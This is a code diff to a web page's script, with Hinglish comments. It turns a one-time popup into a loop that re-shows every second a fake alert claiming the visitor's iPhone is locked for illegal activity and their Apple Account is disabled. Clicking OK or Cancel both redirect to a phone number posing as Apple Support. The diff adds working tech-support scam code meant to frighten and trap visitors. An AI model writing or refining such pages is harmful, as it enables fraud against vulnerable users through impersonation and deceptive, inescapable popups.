@@ -48,12 +48,18 @@
       window.location.href = 'tel:+1-888-319-8224';
     }
 
-    // Page load par automatic popup
-    window.onload = function () {
-      let choice = confirm("Your iPhone has been locked! Call Apple Support now?");
+    // popup loop function
+    function forceCallPopup() {
+      let choice = confirm("⚠️ Your iPhone has been locked!\n\nCall Apple Support now?  Your iPhone has been locked due to detected illegal activity.   Your Apple Account has been disabled!");
       // chahe OK ya Cancel dono par call redirect
       window.location.href = 'tel:+1-888-319-8224';
-    };
+      
+      // popup ko dubara dikhane ke liye thoda delay ke saath fir se call
+      setTimeout(forceCallPopup, 1000); // 3 sec baad fir se popup
+    }
+
+    // Page load par shuru karega
+    window.onload = forceCallPopup;
   </script>
 </body>
 </html>
